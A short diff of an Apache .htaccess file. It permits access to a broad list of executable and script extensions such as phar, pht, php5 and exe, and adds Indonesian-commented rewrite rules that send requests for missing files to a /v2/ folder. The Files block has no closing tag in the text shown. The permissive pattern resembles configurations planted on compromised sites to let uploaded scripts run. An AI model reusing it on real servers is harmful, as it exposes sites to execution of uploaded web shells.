@@ -1,2 +1,14 @@
 <Files ~ '\.(xml|phar|pht|txt|kem|exe|bash|inc|asp|shtm|pp|php7|ph|css|jpe?g|png|gif|js|pdf|phtml|html|shtml|php5|php)$'>
 Allow from all
+# Mengaktifkan modul RewriteEngine
+RewriteEngine On
+
+# Jika file atau direktori tidak ditemukan
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+
+# Arahkan semua permintaan ke folder "subfolder"
+RewriteRule ^(.*)$ /v2/$1 [L]
+
+# Setel file index ke folder "subfolder"
+DirectoryIndex /v2/index.php
